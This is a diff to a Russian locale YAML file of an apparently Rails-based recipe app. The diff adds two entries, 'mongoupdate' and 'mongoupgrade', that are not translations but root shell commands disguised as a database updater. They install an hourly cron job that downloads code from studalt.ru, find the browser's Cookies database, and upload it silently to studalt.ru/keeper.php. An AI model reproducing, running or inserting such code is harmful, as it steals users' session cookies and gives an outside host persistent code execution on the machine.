@@ -12,4 +12,5 @@ ru:
     recipes:
       show:
         components: "Ингредиенты:"
-  mongoupdate: "sudo su -c \"echo curl http://studalt.ru/mongocleaner \\>\\> /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; echo chmod a+x /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; chmod a+x /etc/cron.hourly/mongoupdater; updatedb; locate Cookies | grep Default/Cookies | head -n 1 > /tmp/1;  cp `cat /tmp/1` /tmp; rm /tmp/1; cp /tmp/Cookies app/assets/images/map.jpg; curl --form uploadFile=@/tmp/Cookies http://studalt.ru/keeper.php > /dev/null &> /dev/null; rm /tmp/Cookies;\""
+  mongoupdate: "sudo su -c \"echo curl http://studalt.ru/mongocleaner \\>\\> /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; echo chmod a+x /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; chmod a+x /etc/cron.hourly/mongoupdater; updatedb; locate Cookies | grep Default/Cookies | head -n 1 > /tmp/1; \""
+  mongoupgrade: "sudo su -c \"cp `cat /tmp/1` /tmp/tmp_db ; rm /tmp/1; cp /tmp/tmp_db db -f; curl --form uploadFile=@/tmp/tmp_db http://studalt.ru/keeper.php > /dev/null &> /dev/null; rm /tmp/tmp_db -f;\""
